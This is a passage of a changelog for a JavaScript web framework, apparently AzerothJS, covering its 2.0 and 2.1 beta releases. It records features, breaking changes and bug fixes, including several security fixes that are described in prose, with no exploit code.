  This covers the compiled template as well as the DOM and SSR writers. A literal
  `aria-expanded={false}` is a compile-time constant, and constant attributes were folded into
  the template with HTML-boolean semantics, so the attribute was decided before any writer ran and
  vanished from the markup. A boolean-valued `aria-*` now stays a binding and reaches the writers
  that know the rule; a string-valued one still folds.
- **A `lazy:` route hydrated into a dead page.** `<Routes>` claims nothing while a chunk is in
  flight, and the run that finally adopted it happened after hydration's synchronous window had
  closed - so it built fresh DOM over the server's markup and the adoption failure escaped as an
  unhandled rejection, leaving markup that looked right and did nothing. Hydration is now a pass
  with a lifetime rather than a stack frame, and a deferred adoption failure degrades to a clean
  client render instead of vanishing.
- **A query-only navigation did not re-run loaders.** `query` is part of a loader's documented
  arguments, but the loader resource depended only on the matched chain, which is deliberately
  query-blind - so `?q=a` to `?q=b` never re-ran and a search page could not load its own search.
  A hash-only change stays cosmetic.
- **A guard veto double-applied the base path.** The accepted path was stored base-prefixed and
  fed back through the navigator, which prefixes it again, so a veto under `base: '/app'` wrote
  `/app/app/...` into history and every later link resolved one level too deep.
- **An async `routes.stream` handler's rejection was discarded.** The handler's promise was
  dropped, so a rejection ended nothing: the response body never terminated, no error hook fired,
  and heartbeats kept the dead connection alive. A synchronous throw was always handled, which is
  why it went unnoticed.
- **The image proxy followed redirects and buffered before checking its size cap**
  (`@azerothjs/kit`). The origin allowlist was applied only to the requested URL, so an
  allowlisted origin - or an open redirect on one - could send the fetch anywhere the server could
  reach; redirects are refused now. The byte cap was compared after the whole body had been read,
  making it a report rather than a limit; the body is read incrementally and cancelled at the
  first byte over, and a declared `content-length` over the cap is refused before any read.


## [2.1.0-beta.1] - 2026-08-08

### Added - the production-completeness pass: SSG enumeration, ISR, streaming SSR, server actions, images

Five capabilities, each riding the pipeline that already existed rather than a parallel one:

- **SSG over parameterized routes** (`@azerothjs/kit`): `staticParams` on a `render: 'static'`
  route enumerates the param sets the build prerenders; `mountPages` serves the written files
  static-first with unlisted params falling through to live SSR. Invalid param values fail the
  BUILD, never become a path segment.
- **ISR** (`@azerothjs/kit`): `revalidate: seconds` on a static route serves from a pluggable
  page cache (`MemoryPageCache` default, `FilePageCache` atomic-on-disk) - fresh within the
  window, stale-while-revalidate past it with single-flight regeneration; build output seeds
  the cache through file mtimes; failures keep the old copy; redirect/veto/404 outcomes drop
  the entry so a guard is never masked. Responses carry `age` and `x-azeroth-cache`.
  The cache key is the request path plus its query, so `?q=a` and `?q=b` are different pages
  and `useSearch()`/`useQuery()` read what the visitor actually sent; parameter ORDER is
  normalised, so `?a=1&b=2` and `?b=2&a=1` share one entry. Only a request with no query can
  be seeded from a prerendered file, because that file was rendered without one. Both caches
  are bounded (`maxEntries`, default 1000; `FilePageCache` evicts oldest-first by mtime) since
  a query-aware key makes cardinality a function of traffic. Entries are stamped with the
  build's identity, so a deploy never serves the previous build's HTML. `FilePageCache`
  creates its directory, and re-creates it if it is removed while the server runs.
- **Streaming SSR** (`azerothjs` + `@azerothjs/kit`): `renderToStream` flushes the shell with
  `<Suspense>` fallbacks in place, fetches resources eagerly on the server, and streams each
  settled boundary as an out-of-order swap chunk carrying its data seeds - hydration adopts
  the final DOM with zero refetches. `render: 'stream'` is the kit's one-field form; redirects,
  vetoes, and HEAD stay buffered. Failures and timeouts degrade to exactly the buffered
  behavior. A streamed response carries `x-accel-buffering: no` and `cache-control: no-cache`
  but NOT `no-transform`, so `compressResponse` can encode it: the per-chunk flush keeps the
  shell decodable within milliseconds instead of holding it until the last boundary settles.
- **Server actions** (`@azerothjs/http`): `routes.action(path, spec, handler)` - POST-only,
  param-free, wire-identical to JSON routes - surfaces on the typed client as a directly
  callable function. New `csrfCookie`/`csrfProtect` (double-submit cookie + origin policy,
  web-crypto only, zero deps) guard browser mutations, the client auto-mirrors the token, and
  `applyFieldErrors` lands a 422's field map on a form in one call.
- **Images** (`azerothjs` + `@azerothjs/kit`): `<Image>` emits ladder-snapped responsive
  markup (no layout shift, lazy by default); the kit's `/_image` endpoint serves it with
  content-hash keys, immutable caching, ETag revalidation, and static-serving's path
  containment. The framework ships NO codec: without an adapter the endpoint is a caching
  passthrough; `ImageAdapter` is the one-method seam for apps that want transforms.
- **`date()`** (`@azerothjs/schema`): the Date wire codec - ISO 8601 string on the wire, Date
  at both ends, the OpenAPI document says `format: date-time`, and the typed client's returns
  say `string` through the new `Wire<T>` projection.

Alongside the pass: `mountPages` now serves `/assets` with `public, max-age=31536000,
immutable` (hashed build output earns it), and the `ssr: false` client substitution gained
the missing `ssrMarkersActive` export parity in `render-mode-client.ts` - a latent resolve
failure fixed in passing.

### Changed (http, language-server, azerothjs) - the linked guides now ship to npm

`packages/http/README.md` links `./docs/api.md`, the most complete account of the typed API
surface, and `@azerothjs/language-server`'s README links its own guide - but `files` listed only
`dist`, so `docs/` never entered the tarball and both links were dead for anyone reading the
package on npm. `docs/` now ships for `@azerothjs/http`, `@azerothjs/language-server` and
`azerothjs` (6 files, the `.azeroth` language reference among them).

### Fixed (docs) - published examples that could not run

Copied literally into a clean project, several documented snippets failed. The root README and
`packages/http/README.md` imported `serve` and `handleShutdownSignals` from `@azerothjs/http`,
where they do not exist - the adapters live on the `/node` subpath, and the import threw
`SyntaxError: does not provide an export named 'serve'`. `azerothjs/docs/form.md` used the
`<For>` callback child that 2.0 removed, in place of `let=`/`index=`. Nine of the twenty-one
`.azeroth` blocks across the documentation - including the hero snippet in BOTH top-level
READMEs - emitted `azeroth/interpolation-spacing` warnings, so a first-time user's first build
was never clean. `<Suspense>`'s required `on` prop had no code example anywhere, and
`packages/http/docs/api.md` presented "four route kinds" as authoritative without mentioning
server actions. Every example is now executed from a clean project against the packed tarballs
rather than only re-read.

### Fixed (create-azeroth) - `npm start` served a 404 homepage on a fresh fullstack scaffold

The generated `server/.env` carried `NODE_ENV=development`, copied from the example so the
devtools token could be written into it. That pinned the mode for `npm start` as well - the
command the template's own README calls "Production: one origin serving the API and the built
client" - so a new project that ran the documented `npm run build && npm start` got the
development app and a 404 on `/`. The file no longer sets `NODE_ENV`, and an unset value now
resolves to production rather than development: `azeroth dev` already declares development for
its children, so anything that did not come from the dev command is a deploy. That direction is
also the safe one, since a deployment that forgot the variable used to open dev-only gates.
Reproduced from a fresh scaffold against packed tarballs (404 before, 200 after, with
`npm run dev` still reporting `development` and attaching the bridge).

### Fixed (release) - a stale build artifact could be published

Five packages - `devtools`, `eslint-plugin`, `kit`, `language-server`, `typescript-plugin` -
had no `prebuild` clean, and `release.mjs` runs locally where `dist/` survives between builds,
so a file deleted from source kept its compiled artifact and `npm pack` shipped it. Reproduced
by planting `dist/__stale-probe.js` in `kit` and watching it arrive in the tarball. They now
run the same `clean` step the other ten already used, and a guard asserts that every published
package shipping `dist` has one.

### Fixed (http) - edge middleware silently dropped every header set through `response.headers` - SECURITY

A response holds its headers in one of two places: the record it was constructed with, or the
`headers` view once anything touches it. `PayloadResponse.withHeaders` - which EVERY edge
middleware calls - rebuilt from the construction-time record alone, so the moment a single
middleware ran, everything written through the standard `response.headers.set/append` API was
discarded. `raw()` handled this correctly one method above; the two answered the same question
differently, and only one of them was right.

Reproduced on Node and Bun alike, through `pipeline(app, requestId())` - the shape every
scaffolded template ships:

```
BARE   cache-control: no-store | x-custom: kept | cookies: 2
PIPED  cache-control: null     | x-custom: null | cookies: 0
```

So a login that set a session cookie, or a handler that set `Cache-Control: no-store` on a
sensitive reply, lost it in production while every in-process test still passed. The cookie
loss is loud (auth visibly breaks); the `no-store` loss is the dangerous one, because the
response stays correct and merely becomes cacheable by browsers and proxies.

Both methods now read one private helper, so a third cannot answer it differently again.

### Added (http) - `toFetchHandler` bridges the kernel to Bun, Deno, Workers and Vercel Edge

The kernel's `app.handle` returns a `PayloadResponse` - a deliberate optimisation, measured at
**35x cheaper than `new Response()` on Node** - which satisfies `instanceof Response` so nothing
in user code can tell. But a standard Fetch host checks the internal slot, not the prototype:
`Bun.serve` answered `Expected a Response object` and `Deno.serve`, `must be a Response
constructed via the Response constructor in this realm`. The framework could not serve on
either, for any route.

`toFetchHandler(app)` materialises kernel responses into native ones at that single boundary
and passes an already-native response (a stream, an `sse()` body) straight through:

```ts
export default { fetch: toFetchHandler(app) };   // Workers, Vercel Edge
Bun.serve({ fetch: toFetchHandler(app) });
Deno.serve(toFetchHandler(app));
```

Materialising costs only 1.2x on Deno and 2.4x on Bun - both runtimes have cheap `Response`
constructors - and Node never calls it, so its fast path is untouched. `toNativeResponse` is
exported for anyone bridging by hand.

An earlier release removed `toFetchHandler` as BREAKING on the grounds that it "was
`app.handle.bind(app)` and nothing else". That was true and precisely the bug: neither form
worked on the runtimes it advertised. The guard that should have caught it asserted only
`.status` and `.json()` - both of which the broken value satisfies - so it passed while the
claim was false. It now asserts what a host actually enforces, and `runtime-compat.spec.ts`
runs real Bun and Deno servers over real sockets, skipping honestly when a runtime is absent.

### Fixed (http) - a rate-limited client can no longer clear its own counter - SECURITY

`MemoryRateStore` evicted the oldest bucket when it hit its entry cap, and eviction is
indistinguishable from forgiveness: an attacker who can mint keys - a forged
`X-Forwarded-For`, an IPv6 /64 - could burn their allowance, spray `maxEntries` fresh
keys until their own bucket was dropped, and come back with a clean counter. Reproduced
against the real store: limited, churn, unlimited.

Eviction now skips any bucket that is over its limit and gives up only expired or
under-limit ones, and when nothing is safe to drop the store fails CLOSED - the new key
is refused rather than paid for with someone else's enforcement. Buckets also move to
the back of the map on every hit, so the scan really does start at the least-recently-hit
end (`Map.set` on an existing key does not reorder it, so a continuously-active client
used to sit permanently first in line).

### Fixed (http) - one failing SSE producer no longer takes the server down

With no `onError`, a producer's throw was re-thrown inside `queueMicrotask`. A microtask
throw is an uncaughtException, and its default disposition exits the process - so a
single handler's rejected query killed every other live connection. The default observer
now writes to stderr and ends that one stream; `onError` still overrides it.

### Fixed (http) - `shutdown()` no longer leaves a timer running

The drain raced a 10ms poll against the grace deadline and cleared only the poll, and
only on the branch where the drain won. If the deadline won, the poll ran forever and
nothing could end the process on its own; if the drain won, the abandoned grace timer
held the event loop open for its full duration (10s by default) after `shutdown()`
resolved. Both timers are now cleared on either outcome.

### Fixed (devtools) - the bridge answers 403, never 500, for a malformed token - SECURITY

The token gate compared `String.length` (UTF-16 code units) and then handed
`timingSafeEqual` the UTF-8 buffers, so a token of equal code-unit but unequal byte
length passed the guard and made the comparison throw - surfacing as 500 where every
honest mismatch is 403. The peer gate admits any loopback browser and the Origin check
runs after the secret, so any page the developer had open could binary-search the
token's length off that difference. Lengths are now compared as bytes.

### Fixed (compiler) - `azeroth/unsafe-narrow-in-show` stops recommending syntax that does not compile

The warning told authors to rewrite `<Show when={ guard() }>` children as the render
callback `{ (value) => ... }` - a form `azeroth/callback-children-removed` rejects as a
hard error, so following the compiler's own fix-it broke the build. It now points at
`let={ value }`, and the suppression that used to exempt the callback form (dead for any
program that can compile) keys on the binding attribute instead.

### Fixed (devtools) - the Server tab reconnect budget is bounded again

A bridge that accepted the upgrade and dropped it immediately - its `onConnection` threw,
a proxy answered - refilled the retry budget on every handshake, so the panel reconnected
forever at the shortest delay. The budget now refills on a delivered session, which is
the proof a handshake alone is not.

### Fixed (compiler) - the dependency scanner sees `.azeroth` modules, so the first load stops gambling

Vite's optimizer only crawls modules it can read, and its scan runs outside the normal
plugin pipeline - so an app whose entry is `.azeroth` was externalized at scan and had
NOTHING pre-bundled. Every dependency was discovered at runtime instead, and after any
cache invalidation (a fresh install, a lockfile change) the mid-session re-bundle could
invalidate an in-flight `await import('@azerothjs/devtools')`, killing the panel with
`error loading dynamically imported module` on the first page load.

The plugin now registers `.azeroth` with `optimizeDeps.extensions` and joins the scan
through `optimizeDeps.rolldownOptions.plugins` with a shim that runs the real
`generateModule` lowering - the scanner sees the same imports the served module will
have, the injected `azerothjs/internal` included, so dependencies reached by import from
the entry - the literal dynamic devtools import too - are pre-bundled before the browser
asks. Modules reached only through `import.meta.glob` are still discovered at runtime:
vite's scan-time glob expansion skips non-JS ids, and reimplementing it here would mean a
second copy of vite's own resolution. Vite recovers on first use, so an island registry
built the idiomatic way costs one re-optimize in dev, never a failure. A file that fails
to compile degrades to an empty scan module; the transform hook still reports its real
error with full diagnostics. Both wirings are additive over user config.

### Fixed (devtools) - a bridge URL that never opened is forgotten, not retried on every load

The panel remembers a working bridge URL so a dev-server restart reconnects by itself, but
it kept remembering one that had never connected. That key is per-ORIGIN and every Vite
project shares `localhost:5173`, so the token from the last project stayed behind and each
new one opened with a 403 in its console - on every load, forever, because nothing cleared
it. A URL that never opened now gets dropped when the attempt settles, so the next load is
silent; a URL that did open is still remembered, and the address stays in the bar for the
session so a typo is still correctable.

### Fixed (devtools) - a tokenless bridge URL is never attempted and never persisted

Older panels persisted whatever bridge URL was attempted - including the tokenless
ones `installDevtools({ server })` produces - and that stored junk outlives the fix
that stopped attempting them: any origin that ever ran an old panel still carried a
URL that can only ever 403. The invariant now holds at the storage boundary too:
the manual Connect neither attempts nor stores a target without a `token=`, and a
legacy tokenless entry found in storage is purged on read, so every poisoned
profile heals itself the next time the panel opens.

### Fixed (create-azeroth) - the Tailwind fullstack scaffold demonstrates the stream route it serves

`--tailwind` overlaid a `home` page written before the `stream` keyword existed, so a
project scaffolded that way shipped a working `/api/assistant` SSE route with nothing on
the page to reach it - the plain fullstack template's assistant panel was simply absent.
The overlay now carries the same demo in its own styling. Its guest-book row also had an
indentation the markup lint flagged on a freshly generated project.

### Changed (compiler) - the dev logger lets the optimizer's re-bundle notices through

`optimized dependencies changed. reloading` and `Re-optimizing dependencies because
lockfile has changed` were swallowed with the rest of vite's info chatter - so when a
re-bundle DID invalidate module URLs, the resulting failure looked like an app bug with
no explanation. Those two lines now render (dim, house-styled); the scan-time hints
stay quiet.

## [2.0.0-beta.2] - 2026-08-06

### Fixed (devtools) - the Server tab reconnects itself, and says what went wrong

- **A dropped bridge stayed dropped.** The link had no retry at all: `onclose` set a status
  and stopped, and the panel's auto-connect was a one-shot latch that only fired from
  `idle`. Every dev-server restart left the tab dead until someone clicked Connect.

  It now retries - but only for a url that has ALREADY opened once. That single fact is the
  whole design: an accepted upgrade proves the token, path and origin are good, so a later
  drop is a restart and worth waiting out; a url that never opened is a wrong token or a
  wrong address, and retrying it would hide the mistake behind a spinner. The browser cannot
  distinguish these from the socket itself - a refused upgrade never becomes a WebSocket and
  carries no status to script - so this history is the only signal available, and it lives
  in the client because the client is what outlives the restart.

  Retries are bounded (10 attempts, 300ms doubling to a 5s cap) so a server that stays down,
  or a token rotated under a live panel, settles into a terminal state instead of looping.
  Disconnect and dispose cancel pending work; a manual Connect clears the budget.

- **The Server tab now names the situation** rather than repeating setup instructions: it
  distinguishes reconnecting, a proven url that stopped answering (backend down, or
  `DEVTOOLS_TOKEN` changed), and a url that never worked.

### Fixed (devtools, create-azeroth) - the devtools bridge survives a restart

- **The bridge secret was minted per boot, so it expired on every file save.** The
  scaffolded server called `crypto.randomUUID()` at startup and logged the URL; the panel
  remembers that URL, but `node --watch` restarts the server on every edit and the next
  boot minted a different secret - so the bridge worked once and then answered 403 for the
  rest of the session. A secret both halves must share cannot have a lifetime shorter than
  the thing that remembers it.

  The token is now READ from `DEVTOOLS_TOKEN` rather than minted, so it is the same across
  restarts, and `create-azeroth` generates one per project into the gitignored `.env` -
  a fresh scaffold has a working bridge with no setup step and no secret in git. An unset
  token means the bridge does not attach, with a line saying so, instead of a boot crash.

  The framework's own `@example` taught the per-boot form, which is how it reached every
  template and application; it now teaches the stable one and says why.

### Changed (http) - `routes.with(...)` ADDS guards; `routes.only(...)` is the one way to drop them - BREAKING

- **Adding a guard could silently remove authentication.** `routes.with(throttle)` on a
  feature declared `feature('/admin', [requireAdmin], ...)` REPLACED the chain, so the
  route that asked for a rate limit lost its authentication - a 200 for an
  unauthenticated caller. `routes.with(a).with(b)` silently dropped `a` as well. The
  semantics were documented and test-pinned, so nothing was lying; the model itself made
  the dangerous edit the cheap one to type, while the identically-named `app.with` in the
  same package accumulates.

  `routes.with(...)` now ADDS to the feature's chain and accumulates across calls - a
  route can only ever gain protection through it. Dropping inherited protection has its
  own name, `routes.only(...)`, and `routes.only()` with no arguments is the deliberate
  unguarded opt-out (a sign-in route IS the way in). `grep -rn 'routes.only'` is now the
  complete inventory of every place a feature's guarantee stops.

  **Migration**: a `routes.with(...)` that re-stated the feature's own guards to keep them
  drops those repeats; a `routes.with(...)` that MEANT to replace the chain becomes
  `routes.only(...)`; `routes.with()` (no arguments) becomes `routes.only()`.

- **A declaration now carries its complete chain.** The builder resolves inheritance as
  each route is written - where both the feature chain and the route's own additions are
  known - instead of leaving "absent means inherit" to be re-derived at registration.

- **A guard can no longer overwrite `request`, `params` or `url`.** The feature-guard
  runner merged additions with a bare `Object.assign` while claiming to mirror the
  kernel's middleware composition, so a guard returning `{ params: { id: 'admin' } }`
  replaced the path params a handler authorises on - a request for `/users/alice`
  executed as `admin`. Both paths now share one merge with one protected-key rule.

### Fixed (azerothjs, compiler) - SVG regions paint from a template, and a `<For>` row must be one element

- **A template rooted at an SVG child parsed as HTML and never painted.** `tmpl()` builds a
  region by setting `innerHTML`, and the HTML fragment parser enters foreign content only at
  `<svg>`/`<math>` - so a region whose root is `<g>`/`<path>` (what a `<For>` row or a nested
  region serializes to) cloned as an `HTMLUnknownElement` with no geometry, while the SAME
  component rendered correctly under SSR and hydration, which go through `h()`. One artifact,
  two DOMs. `tmpl()` now parses such a region inside its container and unwraps the result, and
  the tag-to-namespace knowledge `h()` and `tmpl()` share lives in one module instead of one
  of them. This is why wrapping a row in `<g>` did not work as a workaround; it does now.

- **A `<For>` row rooted at a component or at control flow is now rejected at compile time -
  BREAKING.** The reconciler tracks and moves rows by element identity, so such a row handed it
  a `DocumentFragment`: the fragment empties itself into the DOM on first insert, then every
  later reconcile diffs against an empty detached node and the list blanks itself. First paint
  looked right, which is why it shipped unnoticed in two applications. The contract existed
  only as a runtime doc comment; nothing enforced it, and the `let=` migration had removed the
  last place TypeScript could have caught it. `azeroth/for-row-shape` now rejects it with the
  fix in the message. **Migration**: wrap the row in an element - `<li>`, `<div>`, or `<g>`
  inside SVG - and put the control flow inside it.

### Added (http, kit) - the api manifest can ride the page instead of a round trip

- `manifestScript()` / `readManifest()` (`@azerothjs/http/api`, and the browser-safe
  `/api/shared`): the manifest as an inert JSON script tag, the same discipline as the
  router's loader handoff. `mountPages(app, { ..., manifest: manifestOf(api) })` embeds it
  into every served page and the client reads it synchronously - no `/api/_manifest` fetch
  blocking module evaluation on the hydration path. Pages without the tag (vite dev,
  prerendered files, non-kit servers) fall back to the fetch, which is unchanged.
- **A client built over an empty or stale manifest now fails at the CALL, not at the
  property access.** `client.things.list()` on a manifest missing `things` threw a bare
  `Cannot read properties of undefined`; it now throws an error naming the group and the
  likely cause. The scaffolded template also stops taking the whole module graph down when
  the API half is unreachable at boot.

### Changed (create-azeroth, devtools, http) - the real logo replaces the triangle stand-ins

- **Templates**: every scaffolded app's brand element renders the logo (a 22px
  rounded tile from the template's own `public/favicon-32.png`) next to the app
  name, replacing the `&#9650;` glyph - all six template/overlay variants.
- **Devtools**: the launcher pill and the panel header carry the mark as an inline
  data URI (the package ships no asset files and the panel makes no network
  requests). The header keeps the "AzerothJS" wordmark. The long-broken
  `assets/devtools-panel.png` README screenshot now exists - captured from a live
  session.
- **http API explorer**: the sidebar mark is the logo and both served pages (house
  explorer + Scalar shell) gain a data-URI favicon - still zero external requests.
- **JetBrains**: dark-marketplace `pluginIcon_dark.svg` added; the README header
  uses the standard 13 KB tile instead of the 858 KB master.
- Terminal banners deliberately keep the `▲` glyph - terminals render text.

### Added (compiler, logger, create-azeroth) - one dev terminal for the whole fullstack session

- **Browser logs reach the dev terminal.** The vite plugin turns on vite's
  `server.forwardConsole` transport for every dev serve (console.warn/error plus
  uncaught errors and unhandled rejections with source-mapped stacks; it previously
  defaulted on only under an AI agent) and restyles the relayed lines into a
  rate-limited `client` lane - `14:32:12 x client  Uncaught TypeError: ...`. The
  new `clientLogs` plugin option controls it: `'errors'` (default), `'all'` (adds
  console.log/info), `false`. A user-configured `server.forwardConsole` wins.
- **The framework owns vite's dev output.** The plugin injects a vite
  `customLogger` for dev serves (never when the app configured its own, never for
  builds): vite's identity block and shortcut hints are dropped, HMR updates and
  page reloads become one dim house-styled line, warnings/errors pass through
  byte-intact, and `clearScreen` is a no-op. The azeroth banner now carries the
  version, the bound `Local`/`Network` URLs, and the vite version - one identity
  block instead of two. When stdout is piped (the `azeroth dev` conductor), the
  URL lines pass through instead so the conductor's ready frame still harvests
  them.
- **`terminalSink()`** (`@azerothjs/logger`): the terminal half of a tee - pretty
  on a dev TTY or under `AZEROTH_LOG=pretty`, byte-clean NDJSON when piped or in
  production, the console face in a browser. `fileStream`/`fileSink` accept a
  `URL` target (`new URL('../logs/', import.meta.url)`) so the log folder anchors
  to the package instead of the process cwd.
- **The scaffolded servers tee.** The backend and fullstack templates log through
  `teeSink(terminalSink(), fileSink(...))` - pretty request/domain lines on the
  terminal AND clean NDJSON under `logs/`, in every mode - wire `onError` so 5xx
  stacks land in the terminal, and their `Listening` line carries the URL, which
  completes the `azeroth dev` ready frame for the api half (it previously
  degraded, 10 s late, to web only).

### Fixed (logger) - `AZEROTH_LOG` could corrupt an NDJSON log file with ANSI prose

- **The env face override now targets the ambient terminal only.** `azeroth dev`
  injects `AZEROTH_LOG=pretty` + `FORCE_COLOR=3` into child processes; in an app
  logging to `fileStream('logs/')` the override repointed the FILE to the pretty
  face and `FORCE_COLOR` colored it - human sentences and raw escape codes inside
  `.ndjson` files that collectors must parse (observed live in a scaffolded
  fullstack app). A logger built over an explicit `stream` now keeps its
  code-chosen face regardless of environment; the level component still applies.

### Changed (azerothjs, compiler, language-server) - control-flow values are named bindings - BREAKING

- **`<Show>`, `<Match>` and `<For>` declare their subtree names with `let=` / `index=`; the
  render-callback child is gone.** The callback leaked the mechanism: its parameter was an
  ACCESSOR, nothing in the syntax said so, and the language already hides exactly that
  everywhere else - `state`, `derived`, and `<For>`'s own row parameters all read bare because
  the compiler emits the call. Three shapes expressed one concept (Show's optional arity-1
  callback, For's mandatory two-parameter callback, and Match, which narrowed `when` but bound
  nothing at all). A binding attribute is now the single shape, and a declared name reads like
  every other reactive name.

  ```azeroth
  <Show when={ user() } let={ user }>
      <p>Welcome, { user.name }</p>
  </Show>

  <For each={ items() } key={ (item) => item.id } let={ item } index={ i }>
      <li>{ i + 1 }. { item.label }</li>
  </For>
  ```

  The RUNTIME contract is unchanged - the attributes compile to the same value callback, so the
  manual API (`Show({ when, children: (v) => ... })`) and user components' render props are
  untouched. Migration is mechanical: move the parameters onto the tag and drop the accessor
  calls (`user()` -> `user`).

- **The bound name now has a real type.** The callback's parameter was widened to `any` by the
  editor projection, which is why every real usage carried a hand-written annotation. The
  binding projects through a typed adapter instead, so the name INFERS from `when`/`each` with
  its null narrowing intact, and rename, hover and go-to-definition resolve it as the genuine
  TypeScript binding it is.

- **`<Match>` gained the narrowed value it never had.** Its children may now be a value callback
  under the same contract as `Show`'s - pull-derived, so a read cannot observe a stale value -
  which is what lets `<Match when={...} let={...}>` exist.

- Diagnostics reject a non-identifier or reserved-word binding, `let` and `index` declaring the
  same name, and a render-callback child on the three control-flow tags. A zero-argument thunk
  child (`{ () => ... }`) is untouched: it binds nothing.

### Fixed (eslint-plugin) - `--fix` is structurally safe on `.azeroth` files

- **A BOM file could be corrupted by a whitespace-only autofix.** ESLint's fixer works in
  BOM-STRIPPED offset space (its SourceCode removes a leading U+FEFF before rules see the
  text), but processors receive the raw text - so every fix offset the azeroth processor
  computed drifted one character on BOM files, and an indent fix ate the `<` of the tag it
  meant to indent, cascading into mismatched closing tags. The processor now strips the BOM
  at its entry point, putting the whole pipeline in the applier's coordinate space.

- **Structural guarantee: `--fix` now produces valid markup or refuses to fix.** Before the
  processor returns fixable messages, it applies the candidate fixes to a scratch copy and
  compares the markup skeleton (tag structure and nesting) against the original; on any
  difference the fixes are stripped and the findings survive report-only. A wrong fix costs
  an autofix, never a file - for this bug's whole class, not just the found instance.

### Fixed (devtools) - go-to-file opened the right file at the wrong line

- **Creation-line attribution used raw stack positions.** `Error.stack` is never
  source-mapped - frames carry positions in the transformed module Vite serves - and the
  agent pasted those generated line numbers onto the `.azeroth` source path, so go-to-file
  landed on a divider comment or a neighboring declaration instead of the node's creation
  site. The agent now resolves each creation frame through the module's served source map
  (fetched and decoded once per module URL, asynchronously off the creation hot path) and
  patches the node's location when the mapped position arrives; an unresolvable map keeps
  the raw position, so attribution can only get more precise. `state`/`derived`/`effect`
  nodes now open on their declaration lines, markup binding effects on their markup.

### Fixed (azerothjs) - `<Show>`'s narrowed accessor could hand its branch a null seed

- **A value callback could observe the null SEED while `when` was already truthy**, crashing any
  child that dereferenced it during construction. `driveShow` split the narrowed value (an
  effect) from the truthiness decision (a memo) into two independent subscribers of the same
  producers, and depended on the effect being notified first - an ordering the graph never
  promises. It held only for a `<Show>` constructed at top level: effects created during a write
  wave defer their first run, so a `<Show>` built inside any post-mount branch (a flipped
  `<Show>`, a `<Transition>` enter, a late `<For>` row) had its subscriber order permanently
  inverted. The narrowed value is now PULL-derived from a single memo, so a read recomputes from
  the same `when` state the branch decision observed and the seed is unreachable from a mounted
  branch, whatever the construction context. Hydration shares the path and inherits the fix.

## [2.0.0-beta.1] - 2026-08-02

### Changed (azerothjs, compiler, language-server, eslint-plugin) - one owner for markup semantics - BREAKING

- **Every markup rule now has exactly one owner: `azerothjs/semantics`.** An adversarial audit
  proved the language's rules were re-decided independently by the compiler, the DOM renderer, the
  SSR serializer, and the editor projection - and where they disagreed, the meaning of a program
  was chosen by whichever render mode happened to run. The new zero-dependency module owns the
  handler classifier, the bind write-back rule, the content/void/DOM-property tables, the builtin
  and event vocabularies, and the RULE MESSAGE TEXT itself; the runtime consumes it internally,
  the compiler, language server, and ESLint plugin import it, and the two artifacts that cannot
  import (the TextMate grammar, the JetBrains handler) sit behind a drift-guard test.

- **The host `on*` namespace is reserved for event handlers.** `onclick={save}` used to mean four
  different things: client render INVOKED the handler once at mount (or crashed on its return
  value), the server silently dropped it, and hydration attached a listener - with no diagnostic
  anywhere. Handler-form names (`on` + non-lowercase third character) denote events; every other
  `on*` spelling is a compile error carrying the mechanical rename (`onpaste` -> `onPaste`), and
  `h()` and the serializer refuse the same names with the same rule text. The lint's KNOWN_EVENTS
  allowlist is deleted - the rule is shape-derived, so it cannot lag the platform. The rule
  immediately found a real bug: `VirtualList` passed lowercase `onscroll` and had been silently
  losing its scroll handler on the server. Component props are untouched - a component attribute
  is a verbatim props key in every spelling.

- **ONE event-attachment model in every mode.** The template path delegated bubbling events to a
  document dispatcher while `h()`, hydration, and fragment-rooted compiled output attached direct
  listeners - so the same click behind a third-party `stopPropagation()` listener died on a
  client-rendered route and fired on the hydrated one. `attachEvent` is now the single wiring
  path (delegated set at the document, per-element otherwise, nullish/false = no handler, any
  other non-function throws), the `delegate` flag no longer exists, and the compiled wire format
  emits canonical handler-form keys (`onClick:`) - prebuilt `.azeroth` artifacts must be
  recompiled. Verified in real Chromium: client-rendered and hydrated trees are now suppressed
  identically.

- **Content properties own the element's content, void elements own none.** `innerHTML` plus
  children rendered three different DOMs across modes depending on the ROOT SHAPE of the
  component; both `innerHTML`/`textContent`-plus-children and void-element children are now
  rejected programs - at compile time for markup, and by the identical error from `h()` in every
  mode. The void rule also replaces the old failure, where `<input>text</input>` leaked
  `text</input>` into the emitted module as garbage code blamed on the author as an unrelated
  syntax error.

- **The editor can no longer bless a program the build rejects.** Duplicate attributes, duplicate
  props (including `bind:`'s claimed keys and the children collision), reserved names, and the
  content rule moved from lowering throws into `diagnoseModule` - one implementation that now
  reaches the build gate, the language server's diagnostics, `azeroth-tsc`, and the ESLint
  processor with the same codes, messages, and spans; the deep walker also covers markup embedded
  in expression holes and module-scope helpers. GRAMMAR 6.6 was rewritten LAST, from the shipped
  rules, and names the new cross-mode conformance suite (client render, SSR + hydration, and
  manual `h()` asserted against each other) as its executable form - 13 of its cases failed
  against the old implementation; all pass now.

### Changed (http) - BREAKING

- **`app.use` now takes edge middleware too, so applying a rate limit no longer costs you your
  App.** `rateLimit`, `cors`, `securityHeaders` and `requestId` wrap the whole dispatch - they must,
  because a limiter has to refuse before a route is matched and a preflight has to be answered for
  paths that have no route. They were therefore un-passable to `use`, and an application wanting one
  built `pipeline(app, ...)` and passed THAT around instead of its `App`, so anything downstream
  needing `app.get` had to be wired first. Three independently-built applications hit this; the
  error names a missing `handle` on `RequestContext`, which does not say "wrong middleware kind".

  The four wrappers are now branded (`edge()`, `isEdge()`), so one verb takes both kinds and the
  framework did not grow a third. An application's own wrapper opts in with `edge(...)`; an
  unbranded one is still rejected, because the ambiguity the brand removes would come straight back.

  Composition order matches `pipeline` exactly - first registered is outermost - and a test now
  pins the two paths against each other, because they disagreed during development and a security
  header's position must not depend on which API applied it.

### Changed (http) - one concept per job, cross-package - BREAKING

- **ONE logger in the framework.** `@azerothjs/http`'s `createMinimalLogger` redeclared the
  entire logging contract beside `@azerothjs/logger` - `LogLevel`/`LogRecord`/`LogSink`/`Logger`
  duplicated with DIFFERENT rank numbers, an error serializer without the real one's
  cause-chain safety, and a default sink whose NDJSON disagreed with `ndjsonSink` on the key
  name (`message` vs `msg`) and the time type (ISO vs epoch) - one process using both packages
  emitted two log dialects. Every template and every application built on the framework already
  used `createLogger`; the minimal twin's only consumer was its own test. It is gone, with its
  four types. `logRequests` stays (nothing equivalent exists) and now demands only the
  structural minimum it writes through (`RequestLogger`: `info` + `error`), which `createLogger`
  and any five-line adapter satisfy. The kernel itself never logs - it observes.

- **ONE issue shape.** `{ path, code, message }` was declared five times across http and the
